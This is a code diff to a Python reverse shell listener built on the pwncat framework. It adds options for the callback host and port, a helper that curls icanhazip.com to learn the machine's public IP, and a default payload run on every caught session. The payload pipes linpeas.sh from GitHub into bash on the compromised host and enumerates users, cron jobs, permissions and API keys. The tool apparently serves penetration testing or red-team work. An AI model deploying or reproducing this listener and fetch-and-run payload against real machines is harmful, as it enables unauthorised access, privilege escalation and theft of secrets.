@@ -4,14 +4,24 @@ from pwncat.util import console
 import pwncat.manager
 import signal
 import sys
+import subprocess
 from pathlib import Path
 import argparse
 
 parser = argparse.ArgumentParser(description='reverse shell listener')
-parser.add_argument('--port', dest='port', type=int,
-                    default=4444, help='listen port')
+parser.add_argument('--port',
+                    dest='reverse_shell_port', type=int, default=4444, help='listen port')
+parser.add_argument('--host',
+                    dest='reverse_shell_host', type=str, default=None, help='hostname/ip for the this reverse shell host. Used to reestablish connection or second stage.')
+parser.add_argument('--default-payload', dest='default_payload', type=str, default='curl -L https://github.com/carlospolop/PEASS-ng/releases/download/20240218-68f9adb3/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex | tee /tmp/linpeas.txt', help='default payload is TASK not specified/found.')
 
 args = parser.parse_args()
+
+
+def get_self_ip():
+    result = subprocess.run(
+        ['/bin/bash', '-c', f'curl -s http://ipv4.icanhazip.com'], cwd='/tmp', capture_output=True, text=True)
+    return result.stdout
 
 
 def signal_handler(sig, frame):
@@ -25,7 +35,18 @@ def signal_handler(sig, frame):
 def new_session(session: pwncat.manager.Session):
     # Returning false causes the session to be removed immediately
     session.log("new session")
-    session.run("responder")
+    if args.reverse_shell_host is None:
+        reverse_shell_host = get_self_ip()
+    else:
+        reverse_shell_host = args.reverse_shell_host
+    session.log(f"host: {reverse_shell_host}:{args.reverse_shell_port}")
+    try:
+        session.run(module="responder", reverse_shell_host=reverse_shell_host,
+                    reverse_shell_port=args.reverse_shell_port, default_payload=args.default_payload)
+    except Exception as e:
+        session.log(f'Error executing bash script: {e}')
+        raise e
+
     return False
 
 
@@ -42,7 +63,7 @@ with pwncat.manager.Manager() as manager:
         listener = manager.create_listener(
             protocol="socket",
             host="0.0.0.0",
-            port=args.port,
+            port=args.reverse_shell_port,
             platform="linux",
             established=new_session
         )
